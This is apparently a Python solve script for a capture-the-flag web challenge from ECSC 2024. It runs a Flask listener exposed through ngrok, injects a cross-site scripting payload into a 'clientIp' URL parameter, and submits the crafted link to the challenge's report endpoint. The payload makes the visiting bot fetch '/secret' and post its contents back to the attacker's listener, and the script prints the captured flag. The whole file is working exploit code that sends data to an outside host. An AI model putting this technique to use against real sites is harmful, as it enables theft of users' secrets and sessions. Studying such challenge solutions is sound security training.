import requests 
import urllib.parse as parse
from flask import Flask, request
import ngrok
import re

flag_regex = r'ecsc24\{.+\}'

app = Flask(__name__)

@app.post('/')
def index():
    flag = re.search(flag_regex, request.data.decode())
    print(flag.group(0))

    return ''

listener = ngrok.forward(5000, authtoken_from_env=True)

base_url = 'https://s69.ecsc24.hack.cert.pl'
webhook_url = ''

payload = f"""
"><script>fetch('/secret').then(x=>x.text()).then(x=>fetch('{listener.url()}', {{mode:'no-cors', method:'post', body:x}}))</script>
""".strip()

payload = parse.quote(payload)

url = f"{base_url}/save?email=test@test.pl&password=xd&clientIp={payload}&fax=999999999"

r = requests.post(f'{base_url}/submit', data={'url': url, 'reason': 'foo'}, headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
}).text

print(r)


app.run(host='0.0.0.0', port=5000)